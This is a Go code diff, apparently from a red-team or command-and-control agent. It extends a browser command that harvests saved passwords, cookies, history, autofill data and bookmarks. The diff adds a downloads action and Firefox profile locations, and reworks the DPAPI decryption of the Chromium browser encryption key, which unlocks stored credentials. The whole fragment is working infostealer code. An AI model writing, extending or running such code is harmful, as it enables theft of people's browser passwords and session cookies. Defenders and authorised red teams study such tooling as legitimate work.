@@ -76,14 +76,17 @@ func (c *BrowserCommand) Execute(task structs.Task) structs.CommandResult {
 		return browserAutofill(args)
 	case "bookmarks":
 		return browserBookmarks(args)
+	case "downloads":
+		return browserDownloads(args)
 	default:
-		return errorf("Unknown action: %s. Use: passwords, cookies, history, autofill, bookmarks", args.Action)
+		return errorf("Unknown action: %s. Use: passwords, cookies, history, autofill, bookmarks, downloads", args.Action)
 	}
 }
 
 // browserPaths returns the User Data directories for supported browsers
 func browserPaths(browser string) map[string]string {
 	localAppData := os.Getenv("LOCALAPPDATA")
+	appData := os.Getenv("APPDATA")
 	if localAppData == "" {
 		return nil
 	}
@@ -93,6 +96,9 @@ func browserPaths(browser string) map[string]string {
 		"Chromium": filepath.Join(localAppData, "Chromium", "User Data"),
 		"Edge":     filepath.Join(localAppData, "Microsoft", "Edge", "User Data"),
 	}
+	if appData != "" {
+		all["Firefox"] = filepath.Join(appData, "Mozilla", "Firefox", "Profiles")
+	}
 
 	switch strings.ToLower(browser) {
 	case "chrome":
@@ -101,6 +107,11 @@ func browserPaths(browser string) map[string]string {
 		return map[string]string{"Chromium": all["Chromium"]}
 	case "edge":
 		return map[string]string{"Edge": all["Edge"]}
+	case "firefox":
+		if v, ok := all["Firefox"]; ok {
+			return map[string]string{"Firefox": v}
+		}
+		return nil
 	default:
 		return all
 	}
@@ -113,6 +124,7 @@ func getEncryptionKey(userDataDir string) ([]byte, error) {
 	if err != nil {
 		return nil, fmt.Errorf("read Local State: %w", err)
 	}
+	defer structs.ZeroBytes(data)
 
 	var localState struct {
 		OsCrypt struct {
@@ -131,15 +143,15 @@ func getEncryptionKey(userDataDir string) ([]byte, error) {
 	if err != nil {
 		return nil, fmt.Errorf("base64 decode key: %w", err)
 	}
+	defer structs.ZeroBytes(encryptedKey)
 
 	// Strip "DPAPI" prefix (5 bytes)
 	if len(encryptedKey) < 5 || string(encryptedKey[:5]) != "DPAPI" {
 		return nil, fmt.Errorf("unexpected key prefix (not DPAPI)")
 	}
-	encryptedKey = encryptedKey[5:]
 
-	// Decrypt with DPAPI
-	return dpapiDecrypt(encryptedKey)
+	// Decrypt with DPAPI (pass slice past DPAPI prefix)
+	return dpapiDecrypt(encryptedKey[5:])
 }
 
 // dpapiDecrypt calls CryptUnprotectData to decrypt DPAPI-protected data
@@ -700,4 +712,3 @@ func openBrowserDB(dbPath string) (*sql.DB, func(), error) {
 	cleanup := func() { db.Close() }
 	return db, cleanup, nil
 }
-
